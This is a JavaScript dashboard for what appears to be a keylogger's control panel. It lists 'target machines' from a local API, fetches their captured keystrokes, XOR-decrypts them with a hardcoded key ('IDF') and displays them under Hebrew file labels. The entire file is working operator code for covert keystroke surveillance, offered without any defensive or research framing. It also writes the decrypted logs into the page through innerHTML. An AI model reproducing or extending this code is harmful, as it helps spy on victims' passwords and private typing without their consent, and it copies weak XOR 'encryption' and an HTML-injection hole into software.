const API_BASE = "http://127.0.0.1:5000/api";
const ENCRYPTION_KEY = "IDF";

function xorDecrypt(data, key = ENCRYPTION_KEY) {
  const keyCodes = Array.from(key).map(c => c.charCodeAt(0));
  return Array.from(data).map((c, i) => 
    String.fromCharCode(c.charCodeAt(0) ^ keyCodes[i % keyCodes.length])
  ).join("");
}

async function fetchMachines() {
  const res = await fetch(`${API_BASE}/get_target_machines_list`);
  const data = await res.json();
  return data.machines || [];
}

async function fetchLogs(machine) {
  const res = await fetch(`${API_BASE}/get_keystrokes/${machine}`);
  const data = await res.json();
  return data.keystrokes || [];
}

function toggleLogs(machineDiv) {
  const logsDiv = machineDiv.querySelector(".logs");
  const isVisible = logsDiv.style.display === "block";
  document.querySelectorAll(".logs").forEach(div => div.style.display = "none");
  if (!isVisible) logsDiv.style.display = "block";
}

async function renderMachines() {
  const listDiv = document.getElementById("computer-list");
  const machines = await fetchMachines();

  machines.forEach(machine => {
    const machineDiv = document.createElement("div");
    machineDiv.className = "computer";

    const button = document.createElement("button");
    button.textContent = machine;
    button.onclick = async () => {
      const logs = await fetchLogs(machine);
      const logsDiv = machineDiv.querySelector(".logs");

      const decryptedLogs = logs.map(log => xorDecrypt(log));

      logsDiv.innerHTML = decryptedLogs
        .map((log, i) => `<pre>קובץ ${i+1}:\n${log}</pre>`)
        .join("<hr>");
      toggleLogs(machineDiv);
    };

    const logsDiv = document.createElement("div");
    logsDiv.className = "logs";

    machineDiv.appendChild(button);
    machineDiv.appendChild(logsDiv);
    listDiv.appendChild(machineDiv);
  });
}

renderMachines();
